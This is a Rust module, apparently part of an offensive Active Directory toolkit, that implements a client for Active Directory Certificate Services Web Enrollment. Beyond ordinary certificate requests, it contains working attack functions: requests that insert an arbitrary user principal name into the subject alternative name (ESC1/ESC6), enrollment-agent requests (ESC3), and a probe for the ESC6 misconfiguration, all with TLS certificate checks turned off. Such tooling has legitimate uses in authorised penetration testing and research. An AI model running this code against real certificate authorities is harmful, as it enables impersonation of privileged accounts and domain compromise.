//! ADCS Web Enrollment Communication
//!
//! Implements HTTP communication with Active Directory Certificate Services
//! Web Enrollment interface for certificate requests.
//!
//! Supports both legacy (/certsrv/) and modern ICertRequest interfaces.

use crate::error::{OverthroneError, Result};
use base64::Engine;
use reqwest::{Client, StatusCode};
use std::time::Duration;
use tracing::{debug, info};

// ═══════════════════════════════════════════════════════════
// Web Enrollment Client
// ═══════════════════════════════════════════════════════════

/// Web Enrollment client for ADCS certificate requests
pub struct WebEnrollmentClient {
    http_client: Client,
    ca_server: String,
    use_ssl: bool,
}

impl WebEnrollmentClient {
    /// Create a new Web Enrollment client
    pub fn new(ca_server: &str) -> Result<Self> {
        let http_client = Client::builder()
            .danger_accept_invalid_certs(true) // Often needed for internal CAs
            .timeout(Duration::from_secs(60))
            .redirect(reqwest::redirect::Policy::limited(10))
            .build()
            .map_err(|e| OverthroneError::Connection {
                target: ca_server.to_string(),
                reason: format!("HTTP client creation failed: {}", e),
            })?;

        Ok(Self {
            http_client,
            ca_server: ca_server.to_string(),
            use_ssl: true,
        })
    }

    /// Create client with custom timeout
    pub fn with_timeout(ca_server: &str, timeout_secs: u64) -> Result<Self> {
        let http_client = Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(timeout_secs))
            .redirect(reqwest::redirect::Policy::limited(10))
            .build()
            .map_err(|e| OverthroneError::Connection {
                target: ca_server.to_string(),
                reason: format!("HTTP client creation failed: {}", e),
            })?;

        Ok(Self {
            http_client,
            ca_server: ca_server.to_string(),
            use_ssl: true,
        })
    }

    /// Disable SSL (use HTTP instead of HTTPS)
    pub fn disable_ssl(&mut self) {
        self.use_ssl = false;
    }

    /// Get the base URL for Web Enrollment
    pub fn base_url(&self) -> String {
        let scheme = if self.use_ssl { "https" } else { "http" };
        format!("{}://{}/certsrv", scheme, self.ca_server)
    }

    // ─────────────────────────────────────────────────────────
    // Certificate Request Submission
    // ─────────────────────────────────────────────────────────

    /// Submit a certificate request (CSR) to the CA
    /// 
    /// This is the main entry point for requesting certificates via Web Enrollment.
    /// Returns the raw response body containing the certificate or error.
    pub async fn submit_request(
        &self,
        csr_der: &[u8],
        template: &str,
        attributes: Option<&[(&str, &str)]>,
    ) -> Result<CertificateResponse> {
        info!("Submitting certificate request to {} for template {}", self.ca_server, template);

        // Encode CSR to base64
        let csr_b64 = base64::engine::general_purpose::STANDARD.encode(csr_der);

        // Build form data
        let mut form_data = vec![
            ("Mode", "newreq".to_string()),
            ("CertRequest", csr_b64),
            ("CertAttrib", format!("CertificateTemplate:{}", template)),
            ("TargetStoreFlags", "0".to_string()),
            ("SaveCert", "yes".to_string()),
        ];

        // Add additional attributes
        if let Some(attrs) = attributes {
            let mut cert_attrib = format!("CertificateTemplate:{}", template);
            for (key, value) in attrs {
                cert_attrib.push_str(&format!("\n{}:{}", key, value));
            }
            form_data[2] = ("CertAttrib", cert_attrib);
        }

        // Submit to certfnsh.asp
        let url = format!("{}/certfnsh.asp", self.base_url());
        
        debug!("Submitting to: {}", url);
        
        let response = self.http_client
            .post(&url)
            .form(&form_data)
            .send()
            .await
            .map_err(|e| OverthroneError::Connection {
                target: url.clone(),
                reason: format!("Request failed: {}", e),
            })?;

        let status = response.status();
        let body = response.text().await.unwrap_or_default();

        debug!("Response status: {}", status);
        debug!("Response body length: {} bytes", body.len());

        // Parse the response
        self.parse_response(&body, status)
    }

    /// Submit a certificate request with SAN (for ESC1/ESC6)
    pub async fn submit_request_with_san(
        &self,
        csr_der: &[u8],
        template: &str,
        san_value: &str,
    ) -> Result<CertificateResponse> {
        // Add SAN attribute for ESC6
        let san_str = format!("upn={}", san_value);
        let attributes: Vec<(&str, &str)> = vec![("san", &san_str)];
        
        self.submit_request(csr_der, template, Some(&attributes)).await
    }

    /// Submit a certificate request with enrollment agent certificate (for ESC3)
    pub async fn submit_request_with_agent(
        &self,
        csr_der: &[u8],
        template: &str,
        agent_cert_der: &[u8],
    ) -> Result<CertificateResponse> {
        info!("Submitting agent-signed certificate request for template {}", template);

        // Encode CSR and agent certificate to base64
        let csr_b64 = base64::engine::general_purpose::STANDARD.encode(csr_der);
        let agent_b64 = base64::engine::general_purpose::STANDARD.encode(agent_cert_der);

        // Build form data with agent certificate
        let form_data = vec![
            ("Mode", "newreq".to_string()),
            ("CertRequest", csr_b64),
            ("CertAttrib", format!("CertificateTemplate:{}", template)),
            ("TargetStoreFlags", "0".to_string()),
            ("SaveCert", "yes".to_string()),
            ("AgentCertificate", agent_b64), // Include agent certificate
        ];

        // Submit to certfnsh.asp
        let url = format!("{}/certfnsh.asp", self.base_url());

        debug!("Submitting agent-signed request to: {}", url);

        let response = self.http_client
            .post(&url)
            .form(&form_data)
            .send()
            .await
            .map_err(|e| OverthroneError::Connection {
                target: url.clone(),
                reason: format!("Agent request failed: {}", e),
            })?;

        let status = response.status();
        let body = response.text().await.unwrap_or_default();

        debug!("Agent request response status: {}", status);

        // Parse the response
        self.parse_response(&body, status)
    }


    /// Retrieve a pending certificate by request ID
    pub async fn retrieve_certificate(&self, request_id: u32) -> Result<Vec<u8>> {
        let url = format!(
            "{}/certnew.cer?ReqID={}&Enc=b64",
            self.base_url(),
            request_id
        );

        debug!("Retrieving certificate from: {}", url);

        let response = self.http_client
            .get(&url)
            .send()
            .await
            .map_err(|e| OverthroneError::Connection {
                target: url.clone(),
                reason: format!("Certificate retrieval failed: {}", e),
            })?;

        let body = response.text().await.unwrap_or_default();
        
        // Remove PEM headers and decode
        let cert_b64 = body
            .lines()
            .filter(|line| !line.starts_with("-----"))
            .collect::<String>()
            .replace("\r", "")
            .replace("\n", "");

        base64::engine::general_purpose::STANDARD
            .decode(&cert_b64)
            .map_err(|e| OverthroneError::Decryption(format!("Certificate decode failed: {}", e)))
    }

    // ─────────────────────────────────────────────────────────
    // Response Parsing
    // ─────────────────────────────────────────────────────────

    /// Parse the Web Enrollment response
    fn parse_response(&self, body: &str, status: StatusCode) -> Result<CertificateResponse> {
        // Check for various response patterns
        
        // Success: certificate issued
        if body.contains("Certificate Issued") || body.contains("certnew.cer") {
            let request_id = self.extract_request_id(body)?;
            let cert_data = self.extract_certificate(body)?;
            
            return Ok(CertificateResponse {
                status: ResponseStatus::Issued,
                request_id: Some(request_id),
                certificate: Some(cert_data),
                message: "Certificate issued successfully".to_string(),
            });
        }

        // Pending: requires manager approval
        if body.contains("Certificate Pending") || body.contains("pending") {
            let request_id = self.extract_request_id(body)?;
            
            return Ok(CertificateResponse {
                status: ResponseStatus::Pending,
                request_id: Some(request_id),
                certificate: None,
                message: "Certificate request pending approval".to_string(),
            });
        }

        // Denied: request rejected
        if body.contains("Denied") || body.contains("rejected") {
            let error_msg = self.extract_error_message(body);
            
            return Ok(CertificateResponse {
                status: ResponseStatus::Denied,
                request_id: None,
                certificate: None,
                message: error_msg,
            });
        }

        // Error during processing
        if body.contains("Error") || body.contains("error") {
            let error_msg = self.extract_error_message(body);
            
            return Ok(CertificateResponse {
                status: ResponseStatus::Error,
                request_id: None,
                certificate: None,
                message: error_msg,
            });
        }

        // HTTP error
        if !status.is_success() {
            return Ok(CertificateResponse {
                status: ResponseStatus::Error,
                request_id: None,
                certificate: None,
                message: format!("HTTP error: {}", status),
            });
        }

        // Unknown response
        Ok(CertificateResponse {
            status: ResponseStatus::Unknown,
            request_id: None,
            certificate: None,
            message: format!("Unknown response: {}", body.chars().take(200).collect::<String>()),
        })
    }

    /// Extract request ID from response
    fn extract_request_id(&self, body: &str) -> Result<u32> {
        // Look for ReqID= pattern
        for line in body.lines() {
            if line.contains("ReqID=") || line.contains("Request ID") {
                // Try to extract number
                let num: String = line
                    .chars()
                    .filter(|c| c.is_ascii_digit())
                    .collect();
                
                if let Ok(id) = num.parse::<u32>() {
                    return Ok(id);
                }
            }
        }

        // Default to 0 if not found
        Ok(0)
    }

    /// Extract certificate data from response
    fn extract_certificate(&self, body: &str) -> Result<Vec<u8>> {
        // Look for base64 certificate data between PEM markers
        let mut cert_lines: Vec<String> = Vec::new();
        #[allow(unused_assignments)] // Set inside PEM parsing loop
        let mut in_block = false;

        for line in body.lines() {
            if line.contains("-----BEGIN CERTIFICATE-----") {
                in_block = true;
                continue;
            }
            if line.contains("-----END CERTIFICATE-----") {
                break;
            }
            if in_block {
                cert_lines.push(line.to_string());
            }
        }

        if !cert_lines.is_empty() {
            let cert_b64 = cert_lines.join("");
            return base64::engine::general_purpose::STANDARD
                .decode(&cert_b64)
                .map_err(|e| OverthroneError::Decryption(format!("Certificate decode failed: {}", e)));
        }

        // Try to extract from raw base64 in response
        // Look for a long base64 string
        for line in body.lines() {
            let trimmed = line.trim();
            if trimmed.len() > 100
                && trimmed
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
                && let Ok(decoded) =
                    base64::engine::general_purpose::STANDARD.decode(trimmed)
                {
                    // Check if it looks like a certificate (starts with SEQUENCE tag)
                    if !decoded.is_empty() && decoded[0] == 0x30 {
                        return Ok(decoded);
                    }
                }
        }

        Err(OverthroneError::Adcs("Could not extract certificate from response".to_string()))
    }

    /// Extract error message from response
    fn extract_error_message(&self, body: &str) -> String {
        // Look for common error patterns
        let patterns = [
            "Error:",
            "error:",
            "Denied:",
            "denied:",
            "The request failed",
            "Certificate request failed",
        ];

        for pattern in &patterns {
            if let Some(pos) = body.find(pattern) {
                let end = body[pos..].find('\n').unwrap_or(200).min(200);
                return body[pos..pos + end].trim().to_string();
            }
        }

        // Return generic error
        "Unknown error occurred".to_string()
    }

    // ─────────────────────────────────────────────────────────
    // CA Configuration Checks
    // ─────────────────────────────────────────────────────────

    /// Check if Web Enrollment is available
    pub async fn check_availability(&self) -> Result<bool> {
        let url = format!("{}/default.asp", self.base_url());
        
        debug!("Checking availability: {}", url);

        let response = self.http_client
            .get(&url)
            .send()
            .await;

        match response {
            Ok(resp) => {
                let status = resp.status();
                debug!("Availability check status: {}", status);
                Ok(status.is_success() || status == StatusCode::UNAUTHORIZED)
            }
            Err(e) => {
                debug!("Availability check failed: {}", e);
                Ok(false)
            }
        }
    }

    /// Check if ESC6 is possible (EDITF_ATTRIBUTESUBJECTALTNAME2)
    /// 
    /// This checks if the CA accepts the san attribute in the request.
    pub async fn check_esc6_vulnerable(&self) -> Result<bool> {
        // Create a test request with SAN attribute
        // If accepted (even with error), the flag might be set
        let test_csr = base64::engine::general_purpose::STANDARD.encode(b"test");
        
        let url = format!("{}/certfnsh.asp", self.base_url());
        
        let form_data = [
            ("Mode", "newreq".to_string()),
            ("CertRequest", test_csr),
            ("CertAttrib", "CertificateTemplate:User\nsan:upn=test@test.com".to_string()),
        ];

        let response = self.http_client
            .post(&url)
            .form(&form_data)
            .send()
            .await;

        match response {
            Ok(resp) => {
                let body = resp.text().await.unwrap_or_default();
                // If the error mentions "attribute" rather than "template", ESC6 might work
                // Different CAs respond differently
                Ok(!body.contains("invalid template") && !body.contains("Template not found"))
            }
            Err(_) => Ok(false),
        }
    }

    /// Get CA information
    pub async fn get_ca_info(&self) -> Result<CaInfo> {
        let url = format!("{}/certrqus.asp", self.base_url());
        
        let response = self.http_client
            .get(&url)
            .send()
            .await
            .map_err(|e| OverthroneError::Connection {
                target: url.clone(),
                reason: format!("CA info request failed: {}", e),
            })?;

        let body = response.text().await.unwrap_or_default();
        
        // Extract CA name and available templates
        let ca_name = self.extract_ca_name(&body);
        let templates = self.extract_templates(&body);

        Ok(CaInfo {
            ca_name,
            server: self.ca_server.clone(),
            web_enrollment_url: self.base_url(),
            available_templates: templates,
        })
    }

    fn extract_ca_name(&self, body: &str) -> String {
        // Look for CA name in various places
        for line in body.lines() {
            if line.contains("CA Name") || line.contains("certsrv") {
                // Try to extract
                if let Some(start) = line.find("CN=") {
                    let end = line[start..].find(',').unwrap_or(50).min(50);
                    return line[start..start + end].to_string();
                }
            }
        }
        "Unknown CA".to_string()
    }

    fn extract_templates(&self, body: &str) -> Vec<String> {
        let mut templates = Vec::new();
        
        // Look for template dropdown options
        for line in body.lines() {
            if line.contains("<option") && line.contains("value=")
                && let Some(start_pos) = line.find("value=\"") {
                    let start = start_pos + 7;
                    if let Some(end) = line[start..].find('"') {
                        let template = &line[start..start + end];
                        if !template.is_empty() {
                            templates.push(template.to_string());
                        }
                    }
                }
        }

        // Add common templates if none found
        if templates.is_empty() {
            templates = vec![
                "User".to_string(),
                "Machine".to_string(),
                "WebServer".to_string(),
                "SubCA".to_string(),
            ];
        }

        templates
    }
}

// ═══════════════════════════════════════════════════════════
// Response Types
// ═══════════════════════════════════════════════════════════

/// Status of a certificate request
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ResponseStatus {
    Issued,
    Pending,
    Denied,
    Error,
    Unknown,
}

/// Parsed certificate response
#[derive(Debug, Clone)]
pub struct CertificateResponse {
    pub status: ResponseStatus,
    pub request_id: Option<u32>,
    pub certificate: Option<Vec<u8>>,
    pub message: String,
}

impl CertificateResponse {
    /// Check if certificate was issued
    pub fn is_issued(&self) -> bool {
        self.status == ResponseStatus::Issued
    }

    /// Check if request is pending
    pub fn is_pending(&self) -> bool {
        self.status == ResponseStatus::Pending
    }

    /// Get the certificate in PEM format
    pub fn certificate_pem(&self) -> Option<String> {
        self.certificate.as_ref().map(|cert| {
            let b64 = base64::engine::general_purpose::STANDARD.encode(cert);
            format!(
                "-----BEGIN CERTIFICATE-----\n{}\n-----END CERTIFICATE-----\n",
                b64.as_bytes()
                    .chunks(64)
                    .map(std::str::from_utf8)
                    .filter_map(|r| r.ok())
                    .collect::<Vec<_>>()
                    .join("\n")
            )
        })
    }
}

/// CA Information
#[derive(Debug, Clone)]
pub struct CaInfo {
    pub ca_name: String,
    pub server: String,
    pub web_enrollment_url: String,
    pub available_templates: Vec<String>,
}

// ═══════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_client_creation() {
        let client = WebEnrollmentClient::new("ca.example.com");
        assert!(client.is_ok());
    }

    #[test]
    fn test_base_url() {
        let client = WebEnrollmentClient::new("ca.example.com").unwrap();
        assert_eq!(client.base_url(), "https://ca.example.com/certsrv");
    }

    #[test]
    fn test_response_pem() {
        let response = CertificateResponse {
            status: ResponseStatus::Issued,
            request_id: Some(123),
            certificate: Some(vec![0x30, 0x82, 0x01, 0x00]), // Mock DER
            message: "Success".to_string(),
        };

        let pem = response.certificate_pem();
        assert!(pem.is_some());
        assert!(pem.unwrap().contains("BEGIN CERTIFICATE"));
    }

    #[test]
    fn test_response_status_checks() {
        let issued = CertificateResponse {
            status: ResponseStatus::Issued,
            request_id: None,
            certificate: None,
            message: "".to_string(),
        };
        assert!(issued.is_issued());
        assert!(!issued.is_pending());

        let pending = CertificateResponse {
            status: ResponseStatus::Pending,
            request_id: None,
            certificate: None,
            message: "".to_string(),
        };
        assert!(pending.is_pending());
        assert!(!pending.is_issued());
    }
}